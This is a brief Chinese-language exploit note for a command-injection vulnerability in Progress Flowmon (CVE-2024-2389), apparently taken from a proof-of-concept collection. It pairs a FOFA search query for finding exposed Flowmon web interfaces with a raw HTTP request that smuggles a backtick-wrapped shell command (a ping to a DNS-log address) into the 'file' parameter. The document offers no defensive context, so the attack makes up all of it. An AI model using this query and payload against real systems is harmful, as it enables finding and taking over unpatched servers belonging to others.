## Progress-Flowmon命令注入漏洞(CVE-2024-2389)


## fofa
```
body="Flowmon-Web-Interface"
```


## poc
```
GET /service.pdfs/confluence?lang=en&file=`ping+dnslog地址` HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```
